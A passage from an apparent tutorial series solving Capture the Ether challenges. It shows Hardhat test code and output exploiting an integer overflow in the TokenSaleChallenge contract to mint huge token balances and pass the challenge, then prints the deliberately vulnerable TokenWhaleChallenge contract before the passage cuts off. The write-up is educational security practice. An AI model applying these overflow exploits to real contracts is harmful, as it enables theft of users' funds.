</span></span></code><!--]--></pre></div></div><p><!--[-->Now if we call the contract with our overflowed value, we&#39;ll be able to see how many Wei we need to send with the transaction in order to pass the requirement.<!--]--></p><div language="typescript" meta style=""><div class="border shadow-lg bg-code_background my-2 rounded-md py-3 px-5 group overflow-x-auto"><div class="flex sm:grid sm:grid-cols-3 mb-3 justify-between items-center"><div class="flex gap-2"><div class="size-3 rounded-full bg-[#FE5F57] hidden group-hover:block"></div><div class="size-3 rounded-full bg-[#FEBC2E] hidden group-hover:block"></div><div class="size-3 rounded-full bg-[#28C840] hidden group-hover:block"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div></div><div class="font-mono text-xs text-center dark:text-white/60 max-sm:truncate">test/math/token-sale.ts</div><div class="flex justify-end text-zinc-50"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy-icon cursor-pointer opacity-50"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></div></div><pre class="language-typescript shiki shiki-themes github-dark my-0 font-[500] bg-transparent leading-normal font-mono"><!--[--><code><span class="line" line="1"><span style="--shiki-default:#F97583">import</span><span style="--shiki-default:#E1E4E8"> { expect } </span><span style="--shiki-default:#F97583">from</span><span style="--shiki-default:#9ECBFF"> &quot;chai&quot;</span><span style="--shiki-default:#E1E4E8">;
</span></span><span class="line" line="2"><span style="--shiki-default:#F97583">import</span><span style="--shiki-default:#E1E4E8"> { BigNumber } </span><span style="--shiki-default:#F97583">from</span><span style="--shiki-default:#9ECBFF"> &quot;ethers&quot;</span><span style="--shiki-default:#E1E4E8">;
</span></span><span class="line" line="3"><span style="--shiki-default:#F97583">import</span><span style="--shiki-default:#E1E4E8"> { ethers } </span><span style="--shiki-default:#F97583">from</span><span style="--shiki-default:#9ECBFF"> &quot;hardhat&quot;</span><span style="--shiki-default:#E1E4E8">;
</span></span><span class="line" line="4"><span emptylineplaceholder="true">
</span></span><span class="line" line="5"><span style="--shiki-default:#B392F0">describe</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#9ECBFF">&quot;TokenSaleChallenge&quot;</span><span style="--shiki-default:#E1E4E8">, </span><span style="--shiki-default:#F97583">function</span><span style="--shiki-default:#E1E4E8"> () {
</span></span><span class="line" line="6"><span style="--shiki-default:#B392F0">  it</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#9ECBFF">&quot;should return true if we steal all the contract&#39;s ether&quot;</span><span style="--shiki-default:#E1E4E8">, </span><span style="--shiki-default:#F97583">async</span><span style="--shiki-default:#F97583"> function</span><span style="--shiki-default:#E1E4E8"> () {
</span></span><span class="line" line="7"><span style="--shiki-default:#F97583">    const</span><span style="--shiki-default:#E1E4E8"> [, </span><span style="--shiki-default:#79B8FF">player</span><span style="--shiki-default:#E1E4E8">] </span><span style="--shiki-default:#F97583">=</span><span style="--shiki-default:#F97583"> await</span><span style="--shiki-default:#E1E4E8"> ethers.</span><span style="--shiki-default:#B392F0">getSigners</span><span style="--shiki-default:#E1E4E8">();
</span></span><span class="line" line="8"><span emptylineplaceholder="true">
</span></span><span class="line" line="9"><span style="--shiki-default:#F97583">    const</span><span style="--shiki-default:#79B8FF"> Challenge</span><span style="--shiki-default:#F97583"> =</span><span style="--shiki-default:#F97583"> await</span><span style="--shiki-default:#E1E4E8"> ethers.</span><span style="--shiki-default:#B392F0">getContractFactory</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#9ECBFF">&quot;TokenSaleChallenge&quot;</span><span style="--shiki-default:#E1E4E8">);
</span></span><span class="line" line="10"><span emptylineplaceholder="true">
</span></span><span class="line" line="11"><span style="--shiki-default:#F97583">    const</span><span style="--shiki-default:#79B8FF"> challenge</span><span style="--shiki-default:#F97583"> =</span><span style="--shiki-default:#F97583"> await</span><span style="--shiki-default:#E1E4E8"> Challenge.</span><span style="--shiki-default:#B392F0">deploy</span><span style="--shiki-default:#E1E4E8">(player.address, {
</span></span><span class="line" line="12"><span style="--shiki-default:#E1E4E8">      value: ethers.utils.</span><span style="--shiki-default:#B392F0">parseEther</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#9ECBFF">&quot;1&quot;</span><span style="--shiki-default:#E1E4E8">),
</span></span><span class="line" line="13"><span style="--shiki-default:#E1E4E8">    });
</span></span><span class="line" line="14"><span style="--shiki-default:#F97583">    await</span><span style="--shiki-default:#E1E4E8"> challenge.</span><span style="--shiki-default:#B392F0">deployed</span><span style="--shiki-default:#E1E4E8">();
</span></span><span class="line" line="15"><span emptylineplaceholder="true">
</span></span><span class="line" line="16"><span style="--shiki-default:#F97583">    const</span><span style="--shiki-default:#79B8FF"> buyTx</span><span style="--shiki-default:#F97583"> =</span><span style="--shiki-default:#F97583"> await</span><span style="--shiki-default:#E1E4E8"> challenge
</span></span><span class="line" line="17"><span style="--shiki-default:#E1E4E8">      .</span><span style="--shiki-default:#B392F0">connect</span><span style="--shiki-default:#E1E4E8">(player)
</span></span><span class="line" line="18"><span style="--shiki-default:#E1E4E8">      .</span><span style="--shiki-default:#B392F0">buy</span><span style="--shiki-default:#E1E4E8">(
</span></span><span class="line" line="19"><span style="--shiki-default:#E1E4E8">        ethers.constants.MaxUint256.</span><span style="--shiki-default:#B392F0">div</span><span style="--shiki-default:#E1E4E8">(
</span></span><span class="line" line="20"><span style="--shiki-default:#E1E4E8">          BigNumber.</span><span style="--shiki-default:#B392F0">from</span><span style="--shiki-default:#E1E4E8">(ethers.utils.</span><span style="--shiki-default:#B392F0">parseEther</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#9ECBFF">&quot;1&quot;</span><span style="--shiki-default:#E1E4E8">))
</span></span><span class="line" line="21"><span style="--shiki-default:#E1E4E8">        ).</span><span style="--shiki-default:#B392F0">add</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">1</span><span style="--shiki-default:#E1E4E8">)
</span></span><span class="line" line="22"><span style="--shiki-default:#E1E4E8">      );
</span></span><span class="line" line="23"><span emptylineplaceholder="true">
</span></span><span class="line" line="24"><span style="--shiki-default:#F97583">    await</span><span style="--shiki-default:#E1E4E8"> buyTx.</span><span style="--shiki-default:#B392F0">wait</span><span style="--shiki-default:#E1E4E8">();
</span></span><span class="line" line="25"><span style="--shiki-default:#E1E4E8">  });
</span></span><span class="line" line="26"><span style="--shiki-default:#E1E4E8">});
</span></span></code><!--]--></pre></div></div><p><!--[-->Running this test with <code class=""><!--[-->npx hardhat test test/math/token-sale-challenge.ts<!--]--></code> gives us the following output:<!--]--></p><div><div class="border shadow-lg bg-code_background my-2 rounded-md py-3 px-5 group overflow-x-auto"><div class="flex sm:grid sm:grid-cols-3 mb-3 justify-between items-center"><div class="flex gap-2"><div class="size-3 rounded-full bg-[#FE5F57] hidden group-hover:block"></div><div class="size-3 rounded-full bg-[#FEBC2E] hidden group-hover:block"></div><div class="size-3 rounded-full bg-[#28C840] hidden group-hover:block"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div></div><div class="font-mono text-xs text-center dark:text-white/60 max-sm:truncate"></div><div class="flex justify-end text-zinc-50"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy-icon cursor-pointer opacity-50"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></div></div><pre class="my-0 font-[500] bg-transparent leading-normal font-mono"><!--[--><code>Compiling 1 file with 0.4.25
contracts/math/TokenSale.sol:9:5: Warning: Defining constructors as functions with the same name as the contract is deprecated. Use &quot;constructor(...) { ... }&quot; instead.
    function TokenSaleChallenge(address _player) public payable {
    ^ (Relevant source part starts here and spans across multiple lines).

contracts/math/TokenSale.sol:9:33: Warning: Unused function parameter. Remove or comment out the variable name to silence this warning.
    function TokenSaleChallenge(address _player) public payable {
                                ^-------------^

Generating typings for: 1 artifacts in dir: typechain for target: ethers-v5
Successfully generated 5 typings!
Solidity compilation finished successfully


  TokenSaleChallenge
Overflow: 415992086870360064
    1) should return true if we steal all the contract&#39;s ether


  0 passing (815ms)
  1 failing

  1) TokenSaleChallenge
       should return true if we steal all the contract&#39;s ether:
     Error: Transaction reverted without a reason string
      at &lt;UnrecognizedContract&gt;.&lt;unknown&gt; (0x5fbdb2315678afecb367f032d93f642f64180aa3)
      at async HardhatNode._mineBlockWithPendingTxs (node_modules/hardhat/src/internal/hardhat-network/provider/node.ts:1651:23)
      at async HardhatNode.mineBlock (node_modules/hardhat/src/internal/hardhat-network/provider/node.ts:458:16)
      at async EthModule._sendTransactionAndReturnHash (node_modules/hardhat/src/internal/hardhat-network/provider/modules/eth.ts:1496:18)
      at async HardhatNetworkProvider.request (node_modules/hardhat/src/internal/hardhat-network/provider/provider.ts:117:18)
      at async EthersProviderWrapper.send (node_modules/@nomiclabs/hardhat-ethers/src/internal/ethers-provider-wrapper.ts:13:20)
</code><!--]--></pre></div></div><p><!--[-->There we go - if we send 415992086870360064 Wei as the value, we should trick the contract into giving us a huge number of tokens. Let&#39;s try that out:<!--]--></p><div language="diff" meta style=""><div class="border shadow-lg bg-code_background my-2 rounded-md py-3 px-5 group overflow-x-auto"><div class="flex sm:grid sm:grid-cols-3 mb-3 justify-between items-center"><div class="flex gap-2"><div class="size-3 rounded-full bg-[#FE5F57] hidden group-hover:block"></div><div class="size-3 rounded-full bg-[#FEBC2E] hidden group-hover:block"></div><div class="size-3 rounded-full bg-[#28C840] hidden group-hover:block"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div></div><div class="font-mono text-xs text-center dark:text-white/60 max-sm:truncate"></div><div class="flex justify-end text-zinc-50"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy-icon cursor-pointer opacity-50"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></div></div><pre class="language-diff shiki shiki-themes github-dark my-0 font-[500] bg-transparent leading-normal font-mono"><!--[--><code><span class="line" line="1"><span style="--shiki-default:#79B8FF">diff --git a/test/math/token-sale-challenge.ts b/test/math/token-sale-challenge.ts
</span></span><span class="line" line="2"><span style="--shiki-default:#E1E4E8">index 9f3e20a..9c11352 100644
</span></span><span class="line" line="3"><span style="--shiki-default:#FDAEB7">--- a/test/math/token-sale-challenge.ts
</span></span><span class="line" line="4"><span style="--shiki-default:#85E89D">+++ b/test/math/token-sale-challenge.ts
</span></span><span class="line" line="5"><span style="--shiki-default:#B392F0;--shiki-default-font-weight:bold">@@ -18,9 +18,14 @@</span><span style="--shiki-default:#E1E4E8"> describe(&quot;TokenSaleChallenge&quot;, function () {
</span></span><span class="line" line="6"><span style="--shiki-default:#E1E4E8">       .buy(
</span></span><span class="line" line="7"><span style="--shiki-default:#E1E4E8">         ethers.constants.MaxUint256.div(
</span></span><span class="line" line="8"><span style="--shiki-default:#E1E4E8">           BigNumber.from(ethers.utils.parseEther(&quot;1&quot;))
</span></span><span class="line" line="9"><span style="--shiki-default:#FDAEB7">-        ).add(1)
</span></span><span class="line" line="10"><span style="--shiki-default:#85E89D">+        ).add(1),
</span></span><span class="line" line="11"><span style="--shiki-default:#85E89D">+        {
</span></span><span class="line" line="12"><span style="--shiki-default:#85E89D">+          value: BigNumber.from(&quot;415992086870360064&quot;),
</span></span><span class="line" line="13"><span style="--shiki-default:#85E89D">+        }
</span></span><span class="line" line="14"><span style="--shiki-default:#E1E4E8">       );
</span></span><span class="line" line="15"><span emptylineplaceholder="true">
</span></span><span class="line" line="16"><span style="--shiki-default:#E1E4E8">     await buyTx.wait();
</span></span><span class="line" line="17"><span style="--shiki-default:#85E89D">+
</span></span><span class="line" line="18"><span style="--shiki-default:#85E89D">+    console.log(await ethers.provider.getBalance(player.address));
</span></span><span class="line" line="19"><span style="--shiki-default:#E1E4E8">   });
</span></span><span class="line" line="20"><span style="--shiki-default:#E1E4E8"> });
</span></span></code><!--]--></pre></div></div><p><!--[-->If we remove our logs from the contract and then run our test again, we&#39;ll see the following:<!--]--></p><div><div class="border shadow-lg bg-code_background my-2 rounded-md py-3 px-5 group overflow-x-auto"><div class="flex sm:grid sm:grid-cols-3 mb-3 justify-between items-center"><div class="flex gap-2"><div class="size-3 rounded-full bg-[#FE5F57] hidden group-hover:block"></div><div class="size-3 rounded-full bg-[#FEBC2E] hidden group-hover:block"></div><div class="size-3 rounded-full bg-[#28C840] hidden group-hover:block"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div></div><div class="font-mono text-xs text-center dark:text-white/60 max-sm:truncate"></div><div class="flex justify-end text-zinc-50"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy-icon cursor-pointer opacity-50"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></div></div><pre class="my-0 font-[500] bg-transparent leading-normal font-mono"><!--[--><code>Compiling 1 file with 0.4.25
contracts/math/TokenSale.sol:7:5: Warning: Defining constructors as functions with the same name as the contract is deprecated. Use &quot;constructor(...) { ... }&quot; instead.
    function TokenSaleChallenge(address _player) public payable {
    ^ (Relevant source part starts here and spans across multiple lines).

contracts/math/TokenSale.sol:7:33: Warning: Unused function parameter. Remove or comment out the variable name to silence this warning.
    function TokenSaleChallenge(address _player) public payable {
                                ^-------------^

Generating typings for: 1 artifacts in dir: typechain for target: ethers-v5
Successfully generated 5 typings!
Solidity compilation finished successfully


  TokenSaleChallenge
BigNumber { value: &quot;9999583930224367615134&quot; }
    ✓ should return true if we reduce the contract&#39;s ether below 1 (583ms)


  1 passing (586ms)
</code><!--]--></pre></div></div><p><!--[-->Well - that definitely worked! We now have almost 10 sextillion tokens! The rest of the challenge is fairly simple. Unfortunately the contract only has 2 ether in it, so the vast majority of these tokens are of no use to us, but we can at least sell one of them and beat the challenge.<!--]--></p><div language="diff" meta style=""><div class="border shadow-lg bg-code_background my-2 rounded-md py-3 px-5 group overflow-x-auto"><div class="flex sm:grid sm:grid-cols-3 mb-3 justify-between items-center"><div class="flex gap-2"><div class="size-3 rounded-full bg-[#FE5F57] hidden group-hover:block"></div><div class="size-3 rounded-full bg-[#FEBC2E] hidden group-hover:block"></div><div class="size-3 rounded-full bg-[#28C840] hidden group-hover:block"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div></div><div class="font-mono text-xs text-center dark:text-white/60 max-sm:truncate"></div><div class="flex justify-end text-zinc-50"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy-icon cursor-pointer opacity-50"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></div></div><pre class="language-diff shiki shiki-themes github-dark my-0 font-[500] bg-transparent leading-normal font-mono"><!--[--><code><span class="line" line="1"><span style="--shiki-default:#79B8FF">diff --git a/test/math/token-sale-challenge.ts b/test/math/token-sale-challenge.ts
</span></span><span class="line" line="2"><span style="--shiki-default:#E1E4E8">index 9c11352..370f809 100644
</span></span><span class="line" line="3"><span style="--shiki-default:#FDAEB7">--- a/test/math/token-sale-challenge.ts
</span></span><span class="line" line="4"><span style="--shiki-default:#85E89D">+++ b/test/math/token-sale-challenge.ts
</span></span><span class="line" line="5"><span style="--shiki-default:#B392F0;--shiki-default-font-weight:bold">@@ -26,6 +26,9 @@</span><span style="--shiki-default:#E1E4E8"> describe(&quot;TokenSaleChallenge&quot;, function () {
</span></span><span class="line" line="6"><span emptylineplaceholder="true">
</span></span><span class="line" line="7"><span style="--shiki-default:#E1E4E8">     await buyTx.wait();
</span></span><span class="line" line="8"><span emptylineplaceholder="true">
</span></span><span class="line" line="9"><span style="--shiki-default:#FDAEB7">-    console.log(await ethers.provider.getBalance(player.address));
</span></span><span class="line" line="10"><span style="--shiki-default:#85E89D">+    const sellTx = await challenge.connect(player).sell(1);
</span></span><span class="line" line="11"><span style="--shiki-default:#85E89D">+    await sellTx.wait();
</span></span><span class="line" line="12"><span style="--shiki-default:#85E89D">+
</span></span><span class="line" line="13"><span style="--shiki-default:#85E89D">+    expect(await challenge.isComplete()).to.equal(true);
</span></span><span class="line" line="14"><span style="--shiki-default:#E1E4E8">   });
</span></span><span class="line" line="15"><span style="--shiki-default:#E1E4E8"> });
</span></span></code><!--]--></pre></div></div><p><!--[-->Run your test now and you&#39;ll see that it succeeds! One thing to note is that it should technically be possible to drain the contract completely, but we&#39;ll not get into that now - we&#39;ll explore ways to do that later on in the series.<!--]--></p><h3 id="tokenwhalechallenge"><a href="#tokenwhalechallenge"><!--[-->TokenWhaleChallenge<!--]--></a></h3><p><!--[-->Looking at our Smart Contract&#39;s code, we can see that the developer has got wise to our funny business with overflowing integers, and has added some further requirements to the transfer method.<!--]--></p><div language="solidity" meta style=""><div class="border shadow-lg bg-code_background my-2 rounded-md py-3 px-5 group overflow-x-auto"><div class="flex sm:grid sm:grid-cols-3 mb-3 justify-between items-center"><div class="flex gap-2"><div class="size-3 rounded-full bg-[#FE5F57] hidden group-hover:block"></div><div class="size-3 rounded-full bg-[#FEBC2E] hidden group-hover:block"></div><div class="size-3 rounded-full bg-[#28C840] hidden group-hover:block"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div></div><div class="font-mono text-xs text-center dark:text-white/60 max-sm:truncate">contracts/math/TokenWhaleChallenge.sol</div><div class="flex justify-end text-zinc-50"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy-icon cursor-pointer opacity-50"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></div></div><pre class="language-solidity shiki shiki-themes github-dark my-0 font-[500] bg-transparent leading-normal font-mono"><!--[--><code><span class="line" line="1"><span style="--shiki-default:#F97583">pragma</span><span style="--shiki-default:#85E89D"> solidity</span><span style="--shiki-default:#79B8FF"> ^0.4.21</span><span style="--shiki-default:#E1E4E8">;
</span></span><span class="line" line="2"><span emptylineplaceholder="true">
</span></span><span class="line" line="3"><span style="--shiki-default:#F97583">contract</span><span style="--shiki-default:#B392F0"> TokenWhaleChallenge</span><span style="--shiki-default:#E1E4E8"> {
</span></span><span class="line" line="4"><span style="--shiki-default:#79B8FF">    address</span><span style="--shiki-default:#E1E4E8"> player;
</span></span><span class="line" line="5"><span emptylineplaceholder="true">
</span></span><span class="line" line="6"><span style="--shiki-default:#79B8FF">    uint256</span><span style="--shiki-default:#F97583"> public</span><span style="--shiki-default:#E1E4E8"> totalSupply;
</span></span><span class="line" line="7"><span style="--shiki-default:#F97583">    mapping</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">address</span><span style="--shiki-default:#F97583"> =&gt;</span><span style="--shiki-default:#79B8FF"> uint256</span><span style="--shiki-default:#E1E4E8">) </span><span style="--shiki-default:#F97583">public</span><span style="--shiki-default:#E1E4E8"> balanceOf;
</span></span><span class="line" line="8"><span style="--shiki-default:#F97583">    mapping</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">address</span><span style="--shiki-default:#F97583"> =&gt;</span><span style="--shiki-default:#F97583"> mapping</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">address</span><span style="--shiki-default:#F97583"> =&gt;</span><span style="--shiki-default:#79B8FF"> uint256</span><span style="--shiki-default:#E1E4E8">)) </span><span style="--shiki-default:#F97583">public</span><span style="--shiki-default:#E1E4E8"> allowance;
</span></span><span class="line" line="9"><span emptylineplaceholder="true">
</span></span><span class="line" line="10"><span style="--shiki-default:#79B8FF">    string</span><span style="--shiki-default:#F97583"> public</span><span style="--shiki-default:#E1E4E8"> name </span><span style="--shiki-default:#F97583">=</span><span style="--shiki-default:#9ECBFF"> &quot;Simple ERC20 Token&quot;</span><span style="--shiki-default:#E1E4E8">;
</span></span><span class="line" line="11"><span style="--shiki-default:#79B8FF">    string</span><span style="--shiki-default:#F97583"> public</span><span style="--shiki-default:#E1E4E8"> symbol </span><span style="--shiki-default:#F97583">=</span><span style="--shiki-default:#9ECBFF"> &quot;SET&quot;</span><span style="--shiki-default:#E1E4E8">;
</span></span><span class="line" line="12"><span style="--shiki-default:#79B8FF">    uint8</span><span style="--shiki-default:#F97583"> public</span><span style="--shiki-default:#E1E4E8"> decimals </span><span style="--shiki-default:#F97583">=</span><span style="--shiki-default:#79B8FF"> 18</span><span style="--shiki-default:#E1E4E8">;
</span></span><span class="line" line="13"><span emptylineplaceholder="true">
</span></span><span class="line" line="14"><span style="--shiki-default:#F97583">    function</span><span style="--shiki-default:#B392F0"> TokenWhaleChallenge</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">address</span><span style="--shiki-default:#E1E4E8"> _player) </span><span style="--shiki-default:#F97583">public</span><span style="--shiki-default:#E1E4E8"> {
</span></span><span class="line" line="15"><span style="--shiki-default:#E1E4E8">        player </span><span style="--shiki-default:#F97583">=</span><span style="--shiki-default:#E1E4E8"> _player;
</span></span><span class="line" line="16"><span style="--shiki-default:#E1E4E8">        totalSupply </span><span style="--shiki-default:#F97583">=</span><span style="--shiki-default:#79B8FF"> 1000</span><span style="--shiki-default:#E1E4E8">;
</span></span><span class="line" line="17"><span style="--shiki-default:#E1E4E8">        balanceOf[player] </span><span style="--shiki-default:#F97583">=</span><span style="--shiki-default:#79B8FF"> 1000</span><span style="--shiki-default:#E1E4E8">;
</span></span><span class="line" line="18"><span style="--shiki-default:#E1E4E8">    }
</span></span><span class="line" line="19"><span emptylineplaceholder="true">
</span></span><span class="line" line="20"><span style="--shiki-default:#F97583">    function</span><span style="--shiki-default:#B392F0"> isComplete</span><span style="--shiki-default:#E1E4E8">() </span><span style="--shiki-default:#F97583">public</span><span style="--shiki-default:#F97583"> view</span><span style="--shiki-default:#F97583"> returns</span><span style="--shiki-default:#E1E4E8"> (</span><span style="--shiki-default:#79B8FF">bool</span><span style="--shiki-default:#E1E4E8">) {
</span></span><span class="line" line="21"><span style="--shiki-default:#F97583">        return</span><span style="--shiki-default:#E1E4E8"> balanceOf[player] </span><span style="--shiki-default:#F97583">&gt;=</span><span style="--shiki-default:#79B8FF"> 1000000</span><span style="--shiki-default:#E1E4E8">;
</span></span><span class="line" line="22"><span style="--shiki-default:#E1E4E8">    }
</span></span><span class="line" line="23"><span emptylineplaceholder="true">
</span></span><span class="line" line="24"><span style="--shiki-default:#F97583">    event</span><span style="--shiki-default:#B392F0"> Transfer</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">address</span><span style="--shiki-default:#F97583"> indexed</span><span style="--shiki-default:#FFAB70"> from</span><span style="--shiki-default:#E1E4E8">, </span><span style="--shiki-default:#79B8FF">address</span><span style="--shiki-default:#F97583"> indexed</span><span style="--shiki-default:#FFAB70"> to</span><span style="--shiki-default:#E1E4E8">, </span><span style="--shiki-default:#79B8FF">uint256</span><span style="--shiki-default:#FFAB70"> value</span><span style="--shiki-default:#E1E4E8">);
</span></span><span class="line" line="25"><span emptylineplaceholder="true">
</span></span><span class="line" line="26"><span style="--shiki-default:#F97583">    function</span><span style="--shiki-default:#B392F0"> _transfer</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">address</span><span style="--shiki-default:#FFAB70"> to</span><span style="--shiki-default:#E1E4E8">, </span><span style="--shiki-default:#79B8FF">uint256</span><span style="--shiki-default:#FFAB70"> value</span><span style="--shiki-default:#E1E4E8">) </span><span style="--shiki-default:#F97583">internal</span><span style="--shiki-default:#E1E4E8"> {
</span></span><span class="line" line="27"><span style="--shiki-default:#E1E4E8">        balanceOf[</span><span style="--shiki-default:#79B8FF">msg.sender</span><span style="--shiki-default:#E1E4E8">] </span><span style="--shiki-default:#F97583">-=</span><span style="--shiki-default:#E1E4E8"> value;
</span></span><span class="line" line="28"><span style="--shiki-default:#E1E4E8">        balanceOf[to] </span><span style="--shiki-default:#F97583">+=</span><span style="--shiki-default:#E1E4E8"> value;
</span></span><span class="line" line="29"><span emptylineplaceholder="true">
</span></span><span class="line" line="30"><span style="--shiki-default:#F97583">        emit</span><span style="--shiki-default:#B392F0"> Transfer</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">msg.sender</span><span style="--shiki-default:#E1E4E8">, to, value);
</span></span><span class="line" line="31"><span style="--shiki-default:#E1E4E8">    }
</span></span><span class="line" line="32"><span emptylineplaceholder="true">
</span></span><span class="line" line="33"><span style="--shiki-default:#F97583">    function</span><span style="--shiki-default:#B392F0"> transfer</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">address</span><span style="--shiki-default:#FFAB70"> to</span><span style="--shiki-default:#E1E4E8">, </span><span style="--shiki-default:#79B8FF">uint256</span><span style="--shiki-default:#FFAB70"> value</span><span style="--shiki-default:#E1E4E8">) </span><span style="--shiki-default:#F97583">public</span><span style="--shiki-default:#E1E4E8"> {
</span></span><span class="line" line="34"><span style="--shiki-default:#F97583">        require</span><span style="--shiki-default:#E1E4E8">(balanceOf[</span><span style="--shiki-default:#79B8FF">msg.sender</span><span style="--shiki-default:#E1E4E8">] </span><span style="--shiki-default:#F97583">&gt;=</span><span style="--shiki-default:#E1E4E8"> value);
</span></span><span class="line" line="35"><span style="--shiki-default:#F97583">        require</span><span style="--shiki-default:#E1E4E8">(balanceOf[to] </span><span style="--shiki-default:#F97583">+</span><span style="--shiki-default:#E1E4E8"> value </span><span style="--shiki-default:#F97583">&gt;=</span><span style="--shiki-default:#E1E4E8"> balanceOf[to]);
</span></span><span class="line" line="36"><span emptylineplaceholder="true">
</span></span><span class="line" line="37"><span style="--shiki-default:#B392F0">        _transfer</span><span style="--shiki-default:#E1E4E8">(to, value);
</span></span><span class="line" line="38"><span style="--shiki-default:#E1E4E8">    }
</span></span><span class="line" line="39"><span emptylineplaceholder="true">
</span></span><span class="line" line="40"><span style="--shiki-default:#F97583">    event</span><span style="--shiki-default:#B392F0"> Approval</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">address</span><span style="--shiki-default:#F97583"> indexed</span><span style="--shiki-default:#FFAB70"> owner</span><span style="--shiki-default:#E1E4E8">, </span><span style="--shiki-default:#79B8FF">address</span><span style="--shiki-default:#F97583"> indexed</span><span style="--shiki-default:#FFAB70"> spender</span><span style="--shiki-default:#E1E4E8">, </span><span style="--shiki-default:#79B8FF">uint256</span><span style="--shiki-default:#FFAB70"> value</span><span style="--shiki-default:#E1E4E8">);
</span></span><span class="line" line="41"><span emptylineplaceholder="true">
</span></span><span class="line" line="42"><span style="--shiki-default:#F97583">    function</span><span style="--shiki-default:#B392F0"> approve</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">address</span><span style="--shiki-default:#FFAB70"> spender</span><span style="--shiki-default:#E1E4E8">, </span><span style="--shiki-default:#79B8FF">uint256</span><span style="--shiki-default:#FFAB70"> value</span><span style="--shiki-default:#E1E4E8">) </span><span style="--shiki-default:#F97583">public</span><span style="--shiki-default:#E1E4E8"> {
</span></span><span class="line" line="43"><span style="--shiki-default:#E1E4E8">        allowance[</span><span style="--shiki-default:#79B8FF">msg.sender</span><span style="--shiki-default:#E1E4E8">][spender] </span><span style="--shiki-default:#F97583">=</span><span style="--shiki-default:#E1E4E8"> value;
